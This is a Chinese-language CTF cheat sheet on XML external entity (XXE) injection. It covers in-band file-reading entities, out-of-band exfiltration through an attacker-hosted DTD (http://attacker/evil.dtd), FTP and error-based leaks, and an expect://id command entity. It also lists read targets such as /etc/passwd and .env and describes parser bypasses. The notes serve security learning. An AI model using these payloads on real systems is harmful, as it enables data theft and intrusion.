---
comments: true
---

# XXE

> WEB · 知识域。XML 外部实体注入。标签:**Java中XXE**、**XXE文件读取**、**XXE命令执行**、**有回显XXE**、**无回显XXE**。

## 触发特征

- XML 解析入口:表单 XML、API(SOAP/SAML)、文件上传(DOCX/XLSX/SVG)、`Content-Type: text/xml`。
- 依赖:`libxml`、`lxml`、`javax.xml`、`SimpleXML`、`Xerces`。

## 有回显XXE

- 直接实体:`<!ENTITY xxe SYSTEM "file:///flag">` 后 `&xxe;` 回显。
- 参数实体拼结果:`<!ENTITY % file SYSTEM "file:///flag"><!ENTITY % eval "<!ENTITY ex SYSTEM 'file:///%file;'>">%eval;` 外层 `&ex;`。
- 协议差异:Java 支持 `file://`/`http://`/`ftp://`/`jar://`;PHP 额外支持 `php://filter`(base64 读二进制);libxml2 仅 file/http/ftp。

## 无回显XXE(OOB)

- 外部 DTD 托管在攻击者 VPS:`<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;`,evil.dtd 内做参数实体嵌套 → `http://attacker/?data=%exfil;`。
- FTP 外带:捕获完整多行文件内容(FTP 协议逐行发送);HTTP GET 受 URL 长度限制。
- 报错型回显:让错误消息携带文件内容(嵌套实体非法引用触发)。
- 文件路径未知:先 `file:///proc/self/cwd/` 定位工作目录;Java 用 `jar://` 协议列 jar 内路径。

## Java中XXE

- 修复不全的解析器选项:`DOCTYPE` 被禁但 `XInclude` 开启;`XMLInputFactory.SUPPORT_DTD=false` 缺失。
- `DocumentBuilderFactory` vs `SAXParser` vs `XPathExpression` 各自的开关位置。
- CVE 匹配:CairoSVG 超大 width 触发 XXE(BSidesSF 2019,Python);Apache 相关 XXE 变体。
- Java 高版本 JAXP 默认禁外部实体 → 转 SSRF(XInclude / jar:// URL ClassLoader 行为)。

## XXE文件读取

- 常读目标:`/flag`、`/etc/passwd`、`/proc/self/environ`、源码(`php://filter` base64)、配置(`application.yml`、`.env`)。
- 目录列表:Java `file:///` 对目录返回列表(libxml 不行);Windows UNC 探测内网 `file://host/share`。

## XXE命令执行

- PHP expect:// 扩展:`<!ENTITY xxe SYSTEM "expect://id">`(少见于现代环境)。
- 现实路径多为 XXE → SSRF → 内网(见下),或 XXE → 写文件(罕见,需特殊解析器)。
- 命令执行不成立时:读源码找反序列化链 → [Java](java.md)/[PHP](php.md)。

## 变体与入口变形

- **DOCX/Office XML 上传**:`[Content_Types].xml`、`*.rels` 都是 XML → 上传文档触发解析(School CTF 2016)。
- **SVG**:svglib→PNG 管线 XXE(P.W.N. CTF 2018);CairoSVG(width 溢出触发,BSidesSF 2019)。
- 经头注入的 XML:`X-Forwarded-For` 拼入日志型 XML(Pwn2Win 2016);SOAP/SAML 消息体注入。
- 外部 DTD 被过滤 → 编码绕过(UTF-16 文档)、`XInclude`、`xs:import` schema 引用。

## 转向

- OOB 通道建立后探测内网 → [SSRF](ssrf.md);解析器是 JSON/YAML → 对应语言页
